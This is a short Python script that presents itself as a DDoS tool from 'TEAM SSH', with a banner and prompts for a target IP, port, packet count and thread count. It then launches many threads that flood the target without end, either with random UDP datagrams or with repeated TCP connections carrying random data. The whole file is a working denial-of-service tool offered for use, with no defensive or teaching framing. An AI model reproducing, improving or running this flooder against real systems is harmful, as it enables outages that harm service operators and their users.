import random
import socket
import threading
import platform
import codecs
import struct
import time
import socket
import sys
import os

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM SSH is Presenting to you :""")
else :
	print("""
	'\033[4;34m'
 TEAM SSH is Presenting to you :


████████╗███████╗░█████╗░███╗░░░███╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║
░░░██║░░░█████╗░░███████║██╔████╔██║
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝

░██████╗░██████╗██╗░░██╗
██╔════╝██╔════╝██║░░██║
╚█████╗░╚█████╗░███████║
░╚═══██╗░╚═══██╗██╔══██║
██████╔╝██████╔╝██║░░██║
╚═════╝░╚═════╝░╚═╝░░╚═╝
	
	#AUTHOR : SAMORAY
			""")


print("DDos")
ip= str(input("                    Ip Server  :"))
port= int(input("                    Port  :"))
choice = str(input("                   DDoS Attack(y)?? (y/n)  :"))
times= int(input("                   Paket(8000)  :"))
threads= int(input("                    Threads(8000)  :"))
fake_ip = '154.121.76.200'
#Starting Attacking
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM SSH YNIK!!!!")
		except:
			print("[!] 3AWD!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM SSH YNIK!!!!")
		except:
			s.close()
			print("[*] 3AWD!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()